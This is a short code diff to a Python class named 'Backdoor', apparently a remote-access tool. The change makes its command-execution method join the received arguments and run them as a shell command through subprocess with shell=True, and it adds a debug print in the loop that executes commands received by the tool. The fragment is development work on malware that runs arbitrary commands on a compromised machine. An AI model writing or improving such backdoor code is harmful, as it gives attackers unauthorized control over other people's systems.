@@ -42,8 +42,15 @@ class Backdoor:
             
     
     def executeCmd(self,cmd):
+        
         try:
-            cmd = subprocess.check_output(cmd,shell=True)
+            if len(cmd) > 1:
+                joinCmd = ' '.join(cmd)
+                #print(joinCmd)
+                cmd = subprocess.check_output(joinCmd,shell=True)
+            else:
+                cmd = subprocess.check_output(cmd,shell=True)
+                
             return cmd
         except subprocess.CalledProcessError as e:
             return str(e)
@@ -177,6 +184,7 @@ class Backdoor:
             else:   
                 ###print('Try3')
                 ###print('run3_PRE_TRY')
+                #print(self.cmdIn)      
                 cmdOut = self.executeCmd(self.cmdIn)  
                 ###print(f'{cmdOut[1:20]},{type(cmdOut)}')
                 ###print('run4_POST_TRY')
